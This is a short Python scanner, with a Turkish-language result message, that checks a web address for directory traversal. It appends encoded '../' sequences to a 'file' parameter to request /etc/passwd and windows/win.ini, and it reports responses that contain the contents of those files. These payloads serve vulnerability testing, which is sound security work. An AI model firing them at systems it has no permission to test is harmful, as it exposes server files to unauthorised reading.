import requests

LINUX_INDICATORS = ["root:x", "/bin/bash", "/etc/passwd"]
WIN_INDICATORS = ["[extensions]", "[fonts]", "windows"]

PAYLOADS = ["../", "..%2f", "..%252f", "..\\", "..%5c", "%2e%2e%2f"]
TARGETS = ["/etc/passwd", "windows/win.ini"]

def check_directory_traversal(base_url):
    vulnerabilities = []
    base_url = base_url.rstrip("/")

    for payload in PAYLOADS:
        for target in TARGETS:
            full_payload = payload * 5 + target
            test_url = f"{base_url}?file={full_payload}"

            try:
                r = requests.get(test_url, timeout=5)
                content = r.text.lower()
                if any(i in content for i in LINUX_INDICATORS + WIN_INDICATORS):
                    vulnerabilities.append(f"⚠️ Directory Traversal Açığı: {test_url}")
            except requests.RequestException:
                continue

    return vulnerabilities
